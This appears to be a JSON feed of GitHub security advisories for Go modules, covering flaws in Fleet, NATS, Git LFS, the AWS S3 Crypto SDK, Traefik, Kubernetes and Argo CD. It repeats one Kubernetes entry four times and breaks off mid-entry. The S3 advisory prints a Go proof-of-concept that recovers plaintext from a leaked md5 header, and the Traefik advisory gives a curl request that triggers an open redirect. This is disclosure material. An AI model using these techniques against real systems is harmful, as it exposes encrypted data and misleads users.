{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Due to issues in Go's standard library XML parsing, a valid SAML response may be mutated by an attacker to modify the trusted document. This can result in allowing unverified logins from a SAML IdP.</p>\n<p>Users that configure Fleet with SSO login may be vulnerable to this issue.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue is patched in 3.5.1 using <a href=\"https://github.com/mattermost/xml-roundtrip-validator\">https://github.com/mattermost/xml-roundtrip-validator</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If upgrade to 3.5.1 is not possible, users should disable SSO authentication in Fleet.</p>\n<h3 id=\"references\">References</h3>\n<p>See <a href=\"https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities/\">https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities/</a> for more information about the underlying vulnerabilities.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Email us at <a href=\"mailto:security@fleetdm.com\">security@fleetdm.com</a></li>\n<li>Join #fleet in <a href=\"https://join.slack.com/t/osquery/shared_invite/zt-h29zm0gk-s2DBtGUTW4CFel0f0IjTEw\">osquery Slack</a><h3 id=\"references-1\">References</h3>\n</li>\n</ul>\n<ul>\n<li><a href=\"https://github.com/fleetdm/fleet/security/advisories/GHSA-w3wf-cfx3-6gcx\">https://github.com/fleetdm/fleet/security/advisories/GHSA-w3wf-cfx3-6gcx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-26276\">https://nvd.nist.gov/vuln/detail/CVE-2020-26276</a></li>\n<li><a href=\"https://github.com/fleetdm/fleet/commit/57812a532e5f749c8e18c6f6a652eca65c083607\">https://github.com/fleetdm/fleet/commit/57812a532e5f749c8e18c6f6a652eca65c083607</a></li>\n<li><a href=\"https://github.com/fleetdm/fleet/blob/master/CHANGELOG.md#fleet-351-dec-14-2020\">https://github.com/fleetdm/fleet/blob/master/CHANGELOG.md#fleet-351-dec-14-2020</a></li>\n<li><a href=\"https://github.com/mattermost/xml-roundtrip-validator\">https://github.com/mattermost/xml-roundtrip-validator</a></li>\n<li><a href=\"https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities\">https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w3wf-cfx3-6gcx\">https://github.com/advisories/GHSA-w3wf-cfx3-6gcx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w3wf-cfx3-6gcx",
            "title": "[github.com/fleetdm/fleet/v4] SAML authentication vulnerability due to stdlib XML parsing",
            "date_modified": "2022-02-11T23:59:21.000Z",
            "date_published": "2022-02-11T23:59:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w3wf-cfx3-6gcx"
            }
        },
        {
            "content_html": "<h2 id=\"problem-description\">Problem Description</h2>\n<p>The NATS account system has an Operator trusted by the servers, which signs Accounts, and each Account can then create and sign Users within their account.  The Operator should be able to safely issue Accounts to other entities which it does not fully trust.</p>\n<p>A malicious Account could create and sign a User JWT with a state not created by the normal tooling, such that decoding by the NATS JWT library (written in Go) would attempt a nil dereference, aborting execution.</p>\n<p>The NATS Server is known to be impacted by this.</p>\n<h2 id=\"affected-versions\">Affected versions</h2>\n<h4 id=\"jwt-library\">JWT library</h4>\n<ul>\n<li>all versions prior to 1.1.0</li>\n</ul>\n<h4 id=\"nats-server\">NATS Server</h4>\n<ul>\n<li>Version 2 prior to 2.1.9</li>\n</ul>\n<h2 id=\"impact\">Impact</h2>\n<h4 id=\"jwt-library-1\">JWT library</h4>\n<ul>\n<li>Programs would nil dereference and panic, aborting execution by default.</li>\n</ul>\n<h4 id=\"nats-server-1\">NATS server</h4>\n<ul>\n<li>Denial of Service caused by process termination</li>\n</ul>\n<h2 id=\"workaround\">Workaround</h2>\n<p>If your NATS servers do not trust any accounts which are managed by untrusted entities, then malformed User credentials are unlikely to be encountered.</p>\n<h2 id=\"solution\">Solution</h2>\n<p>Upgrade the JWT dependency in any application using it.</p>\n<p>Upgrade the NATS server if using NATS Accounts.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nats-io/jwt/security/advisories/GHSA-h2fg-54x9-5qhq\">https://github.com/nats-io/jwt/security/advisories/GHSA-h2fg-54x9-5qhq</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-26521\">https://nvd.nist.gov/vuln/detail/CVE-2020-26521</a></li>\n<li><a href=\"https://github.com/nats-io/nats-server/commit/9ff8bcde2e46009e98bd9e88f598af355f62c168\">https://github.com/nats-io/nats-server/commit/9ff8bcde2e46009e98bd9e88f598af355f62c168</a></li>\n<li><a href=\"https://advisories.nats.io/CVE/CVE-2020-26521.txt\">https://advisories.nats.io/CVE/CVE-2020-26521.txt</a></li>\n<li><a href=\"https://github.com/nats-io/nats-server/commits/master\">https://github.com/nats-io/nats-server/commits/master</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VT67XCLIIBYRT762SVFBYFFTQFVSM3SI/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VT67XCLIIBYRT762SVFBYFFTQFVSM3SI/</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2020/11/02/2\">http://www.openwall.com/lists/oss-security/2020/11/02/2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h2fg-54x9-5qhq\">https://github.com/advisories/GHSA-h2fg-54x9-5qhq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h2fg-54x9-5qhq",
            "title": "[github.com/nats-io/nats-server/v2] Nil dereference in NATS JWT, DoS of nats-server",
            "date_modified": "2022-02-11T23:43:22.000Z",
            "date_published": "2022-02-11T23:43:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h2fg-54x9-5qhq"
            }
        },
        {
            "content_html": "<h2 id=\"problem-description\">Problem Description</h2>\n<p>NATS nats-server through 2020-10-07 has Incorrect Access Control because of how expired credentials are handled.</p>\n<p>The NATS accounts system has expiration timestamps on credentials; the <a href=\"https://github.com/nats-io/jwt\">https://github.com/nats-io/jwt</a> library had an API which encouraged misuse and an <code>IsRevoked()</code> method which misused its own API.</p>\n<p>A new <code>IsClaimRevoked()</code> method has correct handling and the nats-server has been updated to use this.  The old <code>IsRevoked()</code> method now always returns true and other client code will have to be updated to avoid calling it.</p>\n<p>The CVE identifier should cover any application using the old JWT API, where the nats-server is one of those applications.</p>\n<h2 id=\"affected-versions\">Affected versions</h2>\n<h4 id=\"jwt-library\">JWT library</h4>\n<ul>\n<li>all versions prior to 1.1.0</li>\n<li>fixed after nats-io/jwt PR 103 landed (2020-10-06)</li>\n</ul>\n<h4 id=\"nats-server\">NATS Server</h4>\n<ul>\n<li>Version 2 prior to 2.1.9<ul>\n<li>2.0.0 through and including 2.1.8 are vulnerable.</li>\n</ul>\n</li>\n<li>fixed with nats-io/nats-server PRs 1632, 1635, 1645</li>\n</ul>\n<h2 id=\"impact\">Impact</h2>\n<p>Time-based credential expiry did not work.</p>\n<h2 id=\"workaround\">Workaround</h2>\n<p>Have credentials which only expire after fixes can be deployed.</p>\n<h2 id=\"solution\">Solution</h2>\n<p>Upgrade the JWT dependency in any application using it.</p>\n<p>Upgrade the NATS server if using NATS Accounts.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nats-io/jwt/security/advisories/GHSA-4w5x-x539-ppf5\">https://github.com/nats-io/jwt/security/advisories/GHSA-4w5x-x539-ppf5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-26892\">https://nvd.nist.gov/vuln/detail/CVE-2020-26892</a></li>\n<li><a href=\"https://github.com/nats-io/nats-server/commit/1e08b67f08e18cd844dce833a265aaa72500a12f\">https://github.com/nats-io/nats-server/commit/1e08b67f08e18cd844dce833a265aaa72500a12f</a></li>\n<li><a href=\"https://advisories.nats.io/CVE/CVE-2020-26892.txt\">https://advisories.nats.io/CVE/CVE-2020-26892.txt</a></li>\n<li><a href=\"https://github.com/nats-io/nats-server/commits/master\">https://github.com/nats-io/nats-server/commits/master</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VT67XCLIIBYRT762SVFBYFFTQFVSM3SI/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VT67XCLIIBYRT762SVFBYFFTQFVSM3SI/</a></li>\n<li><a href=\"https://www.openwall.com/lists/oss-security/2020/11/02/2\">https://www.openwall.com/lists/oss-security/2020/11/02/2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4w5x-x539-ppf5\">https://github.com/advisories/GHSA-4w5x-x539-ppf5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4w5x-x539-ppf5",
            "title": "[github.com/nats-io/nats-server/v2] Incorrect handling of credential expiry by NATS Server",
            "date_modified": "2022-02-11T23:42:49.000Z",
            "date_published": "2022-02-11T23:42:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4w5x-x539-ppf5"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>On Windows, if Git LFS operates on a malicious repository with a <code>git.bat</code> or <code>git.exe</code> file in the current directory, that program would be executed, permitting the attacker to execute arbitrary code.  This does not affect Unix systems.</p>\n<p>This occurs because on Windows, Go includes (and prefers) the current directory when the name of a command run does not contain a directory separator.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This version should be patched in v2.12.1, which will be released in coordination with this security advisory.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Other than avoiding untrusted repositories, there is no workaround.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Start a discussion in <a href=\"https://github.com/git-lfs/git-lfs/discussions\">the Git LFS discussion page</a>.</li>\n<li>If you cannot open a discussion, please email the core team using their usernames at <code>github.com</code>.<h3 id=\"references\">References</h3>\n</li>\n</ul>\n<ul>\n<li><a href=\"https://github.com/git-lfs/git-lfs/security/advisories/GHSA-4g4p-42wc-9f3m\">https://github.com/git-lfs/git-lfs/security/advisories/GHSA-4g4p-42wc-9f3m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-27955\">https://nvd.nist.gov/vuln/detail/CVE-2020-27955</a></li>\n<li><a href=\"https://github.com/git-lfs/git-lfs/releases\">https://github.com/git-lfs/git-lfs/releases</a></li>\n<li><a href=\"https://legalhackers.com/advisories/Git-LFS-RCE-Exploit-CVE-2020-27955.html\">https://legalhackers.com/advisories/Git-LFS-RCE-Exploit-CVE-2020-27955.html</a></li>\n<li><a href=\"http://seclists.org/fulldisclosure/2020/Nov/1\">http://seclists.org/fulldisclosure/2020/Nov/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4g4p-42wc-9f3m\">https://github.com/advisories/GHSA-4g4p-42wc-9f3m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4g4p-42wc-9f3m",
            "title": "[github.com/git-lfs/git-lfs] Git LFS can execute a Git binary from the current directory",
            "date_modified": "2022-02-11T23:39:28.000Z",
            "date_published": "2022-02-11T23:39:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4g4p-42wc-9f3m"
            }
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The golang AWS S3 Crypto SDK was impacted by an issue that can result in loss of confidentiality. An attacker with read access to an encrypted S3 bucket was able to recover the plaintext without accessing the encryption key.</p>\n<h3 id=\"riskseverity\">Risk/Severity</h3>\n<p>The vulnerability poses insider risks/privilege escalation risks, circumventing KMS controls for stored data.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>The issue has been fully mitigated by AWS as of Aug. 5th by disallowing the header in question.</p>\n<p>The S3 crypto library tries to store an unencrypted hash of the plaintext alongside the ciphertext as a metadata field. This hash can be used to brute force the plaintext in an offline attack, if the hash is readable to the attacker. In order to be impacted by this issue, the attacker has to be able to guess the plaintext as a whole. The attack is theoretically valid if the plaintext entropy is below the key size, i.e. if it is easier to brute force the plaintext instead of the key itself, but practically feasible only for short plaintexts or plaintexts otherwise accessible to the attacker in order to create a rainbow table.</p>\n<p>The issue has been fixed server-side by AWS as of Aug 5th, by blocking the related metadata field. No S3 objects are affected anymore.</p>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>The header in question is no longer served by AWS, making this attack fully mitigated as of Aug. 5th.</p>\n<h3 id=\"proof-of-concept\">Proof of concept</h3>\n<p>A <a href=\"https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc\">Proof of concept</a> is available in a separate github repository, this particular issue can be found at <a href=\"https://github.com/sophieschmieg/exploits/blob/master/aws_s3_crypto_poc/exploit/hash_exploit.go\">here</a>:</p>\n<pre><code class=\"language-golang\">func HashExploit(bucket string, key string, input *OfflineAttackInput) (string, error) {\n    _, header, err := input.S3Mock.GetObjectDirect(bucket, key)\n    length, err := strconv.Atoi(header.Get(\"X-Amz-Meta-X-Amz-Unencrypted-Content-Length\"))\n    plaintextMd5 := header.Get(\"X-Amz-Meta-X-Amz-Unencrypted-Content-Md5\")\n    blocks := length / 16\n    possiblePlaintextNum := 1\n    segNum := len(input.PossiblePlaintextSegments)\n    for i := 0; i &lt; blocks; i++ {\n        possiblePlaintextNum *= segNum\n    }\n    for i := 0; i &lt; possiblePlaintextNum; i++ {\n        w := i\n        guess := \"\"\n        for j := 0; j &lt; blocks; j++ {\n            guess += input.PossiblePlaintextSegments[w%segNum]\n            w /= segNum\n        }\n        guessMd5 := md5.Sum([]byte(guess))\n        if plaintextMd5 == base64.StdEncoding.EncodeToString(guessMd5[:]) {\n            return guess, nil\n        }\n    }\n    return \"\", fmt.Errorf(\"No plaintext found!\")\n}\n</code></pre>\n<p>The PoC will only work on old versions of the library, as the hash has been removed from being calculated as well.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/google/security-research/security/advisories/GHSA-76wf-9vgp-pj7w\">https://github.com/google/security-research/security/advisories/GHSA-76wf-9vgp-pj7w</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-76wf-9vgp-pj7w\">https://github.com/advisories/GHSA-76wf-9vgp-pj7w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-76wf-9vgp-pj7w",
            "title": "[github.com/aws/aws-sdk-go/service/s3/s3crypto] Unencrypted md5 plaintext hash in metadata in AWS S3 Crypto SDK for golang",
            "date_modified": "2022-02-11T23:26:42.000Z",
            "date_published": "2022-02-11T23:26:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-76wf-9vgp-pj7w"
            }
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>There exists a potential open redirect vulnerability in Traefik's handling of the <code>X-Forwarded-Prefix</code> header. Active Exploitation of this issue is unlikely as it would require active header injection, however the Traefik team addressed this issue nonetheless to prevent abuse in e.g. cache poisoning scenarios.</p>\n<h2 id=\"details\">Details</h2>\n<p>The Traefik API dashboard component doesn't validate that the value of the header <code>X-Forwarded-Prefix</code> is a site relative path and will redirect to any header provided URI.</p>\n<p>e.g.</p>\n<pre><code>$ curl --header 'Host:traefik.localhost' --header 'X-Forwarded-Prefix:https://example.org' 'http://localhost:8081'\n&lt;a href=\"https://example.org/dashboard/\"&gt;Found&lt;/a&gt;.`\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>A successful exploitation of an open redirect can be used to entice victims to disclose sensitive information.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>By using the <code>headers</code> middleware, the request header <code>X-Forwarded-Prefix</code> value can be overridden by the value <code>.</code> (dot)</p>\n<ul>\n<li><a href=\"https://docs.traefik.io/v2.2/middlewares/headers/#customrequestheaders\">https://docs.traefik.io/v2.2/middlewares/headers/#customrequestheaders</a></li>\n<li><a href=\"https://docs.traefik.io/v1.7/basics/#custom-headers\">https://docs.traefik.io/v1.7/basics/#custom-headers</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory, open an issue in <a href=\"https://github.com/containous/traefik/issues\">Traefik</a>.</p>\n<h2 id=\"credit\">Credit</h2>\n<p>This issue was found by the GitHub Application Security Team and reported on behalf of the GHAS by the GitHub Security Lab Team.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containous/traefik/security/advisories/GHSA-6qq8-5wq3-86rp\">https://github.com/containous/traefik/security/advisories/GHSA-6qq8-5wq3-86rp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-15129\">https://nvd.nist.gov/vuln/detail/CVE-2020-15129</a></li>\n<li><a href=\"https://github.com/containous/traefik/pull/7109\">https://github.com/containous/traefik/pull/7109</a></li>\n<li><a href=\"https://github.com/containous/traefik/commit/cfa04c300c5db95ae8a52c31a9d973b6dd9c2254\">https://github.com/containous/traefik/commit/cfa04c300c5db95ae8a52c31a9d973b6dd9c2254</a></li>\n<li><a href=\"https://github.com/containous/traefik/commit/e63db782c11c7b8bfce30be4c902e7ef8f9f33d2\">https://github.com/containous/traefik/commit/e63db782c11c7b8bfce30be4c902e7ef8f9f33d2</a></li>\n<li><a href=\"https://github.com/containous/traefik/releases/tag/v1.7.26\">https://github.com/containous/traefik/releases/tag/v1.7.26</a></li>\n<li><a href=\"https://github.com/containous/traefik/releases/tag/v2.2.8\">https://github.com/containous/traefik/releases/tag/v2.2.8</a></li>\n<li><a href=\"https://github.com/containous/traefik/releases/tag/v2.3.0-rc3\">https://github.com/containous/traefik/releases/tag/v2.3.0-rc3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6qq8-5wq3-86rp\">https://github.com/advisories/GHSA-6qq8-5wq3-86rp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6qq8-5wq3-86rp",
            "title": "[github.com/containous/traefik/api/v2] Open redirect in Traefik",
            "date_modified": "2022-02-11T23:19:37.000Z",
            "date_published": "2022-02-11T23:19:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6qq8-5wq3-86rp"
            }
        },
        {
            "content_html": "<p>As mitigations to a report from 2019 and CVE-2020-8555, Kubernetes attempts to prevent proxied connections from accessing link-local or localhost networks when making user-driven connections to Services, Pods, Nodes, or StorageClass service providers. As part of this mitigation Kubernetes does a DNS name resolution check and validates that response IPs are not in the link-local (169.254.0.0/16) or localhost (127.0.0.0/8) range. Kubernetes then performs a second DNS resolution without validation for the actual connection. If a non-standard DNS server returns different non-cached responses, a user may be able to bypass the proxy IP restriction and access private networks on the control plane.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-8562\">https://nvd.nist.gov/vuln/detail/CVE-2020-8562</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/101493\">https://github.com/kubernetes/kubernetes/issues/101493</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/-MFX60_wdOY\">https://groups.google.com/g/kubernetes-security-announce/c/-MFX60_wdOY</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qh36-44jv-c8xj\">https://github.com/advisories/GHSA-qh36-44jv-c8xj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qh36-44jv-c8xj",
            "title": "[k8s.io/kubernetes] Potential proxy IP restriction bypass in Kubernetes",
            "date_modified": "2022-02-11T23:01:00.000Z",
            "date_published": "2022-02-02T00:01:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qh36-44jv-c8xj"
            }
        },
        {
            "content_html": "<p>As mitigations to a report from 2019 and CVE-2020-8555, Kubernetes attempts to prevent proxied connections from accessing link-local or localhost networks when making user-driven connections to Services, Pods, Nodes, or StorageClass service providers. As part of this mitigation Kubernetes does a DNS name resolution check and validates that response IPs are not in the link-local (169.254.0.0/16) or localhost (127.0.0.0/8) range. Kubernetes then performs a second DNS resolution without validation for the actual connection. If a non-standard DNS server returns different non-cached responses, a user may be able to bypass the proxy IP restriction and access private networks on the control plane.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-8562\">https://nvd.nist.gov/vuln/detail/CVE-2020-8562</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/101493\">https://github.com/kubernetes/kubernetes/issues/101493</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/-MFX60_wdOY\">https://groups.google.com/g/kubernetes-security-announce/c/-MFX60_wdOY</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qh36-44jv-c8xj\">https://github.com/advisories/GHSA-qh36-44jv-c8xj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qh36-44jv-c8xj",
            "title": "[k8s.io/kubernetes] Potential proxy IP restriction bypass in Kubernetes",
            "date_modified": "2022-02-11T23:01:00.000Z",
            "date_published": "2022-02-02T00:01:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qh36-44jv-c8xj"
            }
        },
        {
            "content_html": "<p>As mitigations to a report from 2019 and CVE-2020-8555, Kubernetes attempts to prevent proxied connections from accessing link-local or localhost networks when making user-driven connections to Services, Pods, Nodes, or StorageClass service providers. As part of this mitigation Kubernetes does a DNS name resolution check and validates that response IPs are not in the link-local (169.254.0.0/16) or localhost (127.0.0.0/8) range. Kubernetes then performs a second DNS resolution without validation for the actual connection. If a non-standard DNS server returns different non-cached responses, a user may be able to bypass the proxy IP restriction and access private networks on the control plane.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-8562\">https://nvd.nist.gov/vuln/detail/CVE-2020-8562</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/101493\">https://github.com/kubernetes/kubernetes/issues/101493</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/-MFX60_wdOY\">https://groups.google.com/g/kubernetes-security-announce/c/-MFX60_wdOY</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qh36-44jv-c8xj\">https://github.com/advisories/GHSA-qh36-44jv-c8xj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qh36-44jv-c8xj",
            "title": "[k8s.io/kubernetes] Potential proxy IP restriction bypass in Kubernetes",
            "date_modified": "2022-02-11T23:01:00.000Z",
            "date_published": "2022-02-02T00:01:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qh36-44jv-c8xj"
            }
        },
        {
            "content_html": "<p>As mitigations to a report from 2019 and CVE-2020-8555, Kubernetes attempts to prevent proxied connections from accessing link-local or localhost networks when making user-driven connections to Services, Pods, Nodes, or StorageClass service providers. As part of this mitigation Kubernetes does a DNS name resolution check and validates that response IPs are not in the link-local (169.254.0.0/16) or localhost (127.0.0.0/8) range. Kubernetes then performs a second DNS resolution without validation for the actual connection. If a non-standard DNS server returns different non-cached responses, a user may be able to bypass the proxy IP restriction and access private networks on the control plane.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-8562\">https://nvd.nist.gov/vuln/detail/CVE-2020-8562</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/101493\">https://github.com/kubernetes/kubernetes/issues/101493</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/-MFX60_wdOY\">https://groups.google.com/g/kubernetes-security-announce/c/-MFX60_wdOY</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qh36-44jv-c8xj\">https://github.com/advisories/GHSA-qh36-44jv-c8xj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qh36-44jv-c8xj",
            "title": "[k8s.io/kubernetes] Potential proxy IP restriction bypass in Kubernetes",
            "date_modified": "2022-02-11T23:01:00.000Z",
            "date_published": "2022-02-02T00:01:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qh36-44jv-c8xj"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>This impacts deployments using SAML SSO in two specific cases:</p>\n<ol>\n<li>A malicious or compromised Service Provider (SP) could reuse the SAML response to log into Fleet as a user -- only if the user has an account with the same email in Fleet, <em>and</em> the user signs into the malicious SP via SAML SSO from the same Identity Provider (IdP) configured with Fleet.</li>\n<li>A user with an account in Fleet could reuse a SAML response intended for another SP to log into Fleet. This is only a concern if the user is blocked from Fleet in the IdP, but continues to have an account in Fleet. If the user is blocked from the IdP entirely, this cannot be exploited.</li>\n</ol>\n<h3 id=\"patches\">Patches</h3>\n<p>Fleet 4.9.1 resolves this issue.</p>\n<h3 id=\"workarounds-and-good-practices\">Workarounds and good practices</h3>\n<ul>\n<li>Reduce the length of sessions on your IdP to reduce the window for malicious re-use.</li>\n<li>Limit the amount of SAML Service Providers/Applications used by user accounts with access to Fleet.</li>\n<li>When removing access to Fleet in the IdP, delete the Fleet user from Fleet as well.</li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Join us in the #fleet channel of <a href=\"https://join.slack.com/t/osquery/shared_invite/zt-h29zm0gk-s2DBtGUTW4CFel0f0IjTEw\">osquery Slack</a>.</li>\n<li>Email us at <a href=\"mailto:security@fleetdm.com\">security@fleetdm.com</a>.<h3 id=\"references\">References</h3>\n</li>\n</ul>\n<ul>\n<li><a href=\"https://github.com/fleetdm/fleet/security/advisories/GHSA-ch68-7cf4-35vr\">https://github.com/fleetdm/fleet/security/advisories/GHSA-ch68-7cf4-35vr</a></li>\n<li><a href=\"https://github.com/fleetdm/fleet/commit/35d5a7b285f15ddd47486fa656e8b1acf3d48374\">https://github.com/fleetdm/fleet/commit/35d5a7b285f15ddd47486fa656e8b1acf3d48374</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-23600\">https://nvd.nist.gov/vuln/detail/CVE-2022-23600</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ch68-7cf4-35vr\">https://github.com/advisories/GHSA-ch68-7cf4-35vr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ch68-7cf4-35vr",
            "title": "[github.com/fleetdm/fleet/v4] Limited ability to spoof SAML authentication with missing audience verification in Fleet",
            "date_modified": "2022-02-11T22:53:56.000Z",
            "date_published": "2022-02-07T21:57:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ch68-7cf4-35vr"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>All versions of Argo CD are vulnerable to a path traversal bug that allows to pass arbitrary values files to be consumed by Helm charts. </p>\n<p>Additionally, it is possible to craft special Helm chart packages containing value files that are actually symbolic links, pointing to arbitrary files outside the repository's root directory.</p>\n<p>If an attacker with permissions to create or update Applications knows or can guess the full path to a file containing valid YAML, they can create a malicious Helm chart to consume that YAML as values files, thereby gaining access to data they would otherwise have no access to. </p>\n<p>The impact can especially become critical in environments that make use of encrypted value files (e.g. using plugins with git-crypt or SOPS) containing sensitive or confidential data, and decrypt these secrets to disk before rendering the Helm chart.</p>\n<p>Also, because any error message from <code>helm template</code> is passed back to the user, and these error messages are quite verbose, enumeration of files on the repository server's file system is possible.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<ul>\n<li>v2.3.0</li>\n<li>v2.2.4</li>\n<li>v2.1.9</li>\n</ul>\n<p>We urge users of Argo CD to update their installation to one of the fixed versions as listed above.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No workaround for this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://apiiro.com/blog/malicious-kubernetes-helm-charts-can-be-used-to-steal-sensitive-information-from-argo-cd-deployments\">https://apiiro.com/blog/malicious-kubernetes-helm-charts-can-be-used-to-steal-sensitive-information-from-argo-cd-deployments</a></li>\n<li><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24348\">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24348</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<ul>\n<li>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a></li>\n<li>Join us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel <code>#argo-cd</code></li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<p>The path traversal vulnerability was discovered and reported by Moshe Zioni, VP Security Research, <a href=\"https://www.apiiro.com\">Apiiro</a>. </p>\n<p>During the development of a fix for the path traversal vulnerability, the Argo CD team discovered the related issue with symbolic links.</p>\n<p>The Argo CD team would like to thank Moshe Zioni for the responsible disclosure, and the constructive discussions during handling this issue!</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a 